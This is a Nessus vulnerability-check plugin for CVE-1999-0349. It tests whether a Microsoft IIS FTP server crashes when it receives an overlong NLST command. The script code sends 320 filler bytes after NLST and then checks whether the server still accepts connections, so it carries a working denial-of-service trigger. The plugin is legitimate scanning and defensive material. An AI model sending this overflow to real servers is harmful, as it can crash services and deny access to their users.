#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10118);
 script_version ("$Revision: 1.29 $");
 script_cve_id("CVE-1999-0349");
 script_bugtraq_id(192);
 script_xref(name:"OSVDB", value:"929");

 script_name(english:"Microsoft IIS FTP Server NLST Command Overflow DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial-of-service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the IIS FTP server close all the active 
connections by issuing a too long NLST command which will make the
server crash. An attacker can use this flaw to prevent people from
downloading data from your FTP server." );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/ms99-003.mspx" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"FTP");
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_summary(english:"Crashes an IIS ftp server");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");		
 exit();
}

#
# The script code starts here
#

include("global_settings.inc");
include('ftp_func.inc');

if (report_paranoia < 2) exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login)exit(0);
port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);
if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:password))
 {
  port2 = ftp_pasv(socket:soc);
  if(!port2)exit(0);
  soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
  command = string("NLST ", crap(320), "\r\n");
  send(socket:soc, data:command);
  close(soc2);
 }
 close(soc);
 
 soc3 = open_sock_tcp(port);
 if(!soc3)security_warning(port);
 else close(soc3);
}
 
  
 
